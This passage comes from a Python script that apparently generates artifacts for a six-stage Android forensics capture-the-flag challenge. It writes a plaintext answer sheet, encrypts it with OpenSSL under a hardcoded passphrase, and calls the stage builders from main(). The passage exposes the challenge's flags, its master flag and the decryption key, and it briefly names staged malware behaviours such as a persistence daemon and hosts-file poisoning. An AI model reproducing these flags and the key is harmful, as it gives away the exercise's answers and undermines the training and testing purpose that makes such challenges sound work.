                                 FLAG{st4g3_2_apk_d3c0mp1l3d_dr0pp3r}
  [Stage 3] Defense Evasion    : Play Protect disabled & /system/etc/hosts poisoned
                                 FLAG{st4g3_3_d3f3ns3_3v4s10n_r00t}
  [Stage 4] Root Persistence   : /system/etc/init/shadowd.rc & kworker_netd (TCP 31337)
                                 FLAG{st4g3_4_p3rs1st3nc3_1n1t_d43m0n}
  [Stage 5] Reconnaissance     : Geotagged Dead-Drop EXIF (38.897678, -77.036550)
                                 FLAG{st4g3_5_3x1f_r3c0n_c0ll3ct10n}

================================================================================
  CONGRATULATIONS INVESTIGATOR! YOU HAVE COMPLETED THE FULL FORENSIC TRAIL!
  FINAL MASTER FLAG: FLAG{m4st3r_f0r3ns1c_1nv3st1g4t0r_c0mpl3t3_ch41n}
================================================================================
"""
    with open(plain_ref_path, "w", encoding="utf-8") as f:
        f.write(crown_jewels_plaintext)

    # Encrypt crown_jewels.txt -> crown_jewels.enc using OpenSSL AES-256-CBC PBKDF2 with pass:ViperExfil2026!Key
    import shutil
    openssl_cmd = shutil.which("openssl") or (
        r"C:\Program Files\Git\usr\bin\openssl.exe"
        if os.path.exists(r"C:\Program Files\Git\usr\bin\openssl.exe")
        else "openssl"
    )
    try:
        subprocess.run(
            [
                openssl_cmd,
                "enc",
                "-aes-256-cbc",
                "-pbkdf2",
                "-salt",
                "-in",
                plain_ref_path,
                "-out",
                enc_path,
                "-pass",
                "pass:ViperExfil2026!Key",
            ],
            check=True,
        )
    except Exception:
        # Pure-Python OpenSSL Salted__ PBKDF2 AES-256-CBC compatible encryption fallback
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding

        salt = b"ShadowVt"
        password = b"ViperExfil2026!Key"
        dk = hashlib.pbkdf2_hmac("sha256", password, salt, 10000, 48)
        key, iv = dk[:32], dk[32:48]
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(crown_jewels_plaintext.encode("utf-8")) + padder.finalize()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        ct = encryptor.update(padded_data) + encryptor.finalize()
        with open(enc_path, "wb") as f:
            f.write(b"Salted__" + salt + ct)

    os.remove(plain_ref_path)


def main():
    out_dir = sys.argv[1] if len(sys.argv) > 1 else "/opt/forensics-seeder/artifacts"
    ensure_dir(out_dir)
    create_stage1_databases(out_dir)
    create_stage2_apk_and_appdata(out_dir)
    create_stage3_and_4_persistence(out_dir)
    create_stage5_recon_artifacts(out_dir)
    create_stage6_exfil_vault(out_dir)
    print(f"[+] All 6 stages of forensic artifacts generated in {out_dir}")


if __name__ == "__main__":
    main()
